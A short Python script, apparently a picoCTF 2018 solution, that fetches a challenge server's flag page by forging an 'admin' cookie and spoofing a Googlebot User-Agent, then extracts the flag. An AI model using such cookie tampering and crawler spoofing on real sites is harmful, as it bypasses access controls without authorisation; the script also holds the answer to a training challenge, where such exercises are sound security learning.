#!/bin/bash

import re
import requests

url = 'http://2018shell.picoctf.com:60372/flag'

headers = {
	'User-Agent' : 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
}

r = requests.get(url, cookies = {'admin' : 'True'}, headers = headers)

#print(r.text)
print(re.findall('picoCTF{.*}',r.text)[0])

#note:this is a python3 script unlike the rest which are python2.7 scripts
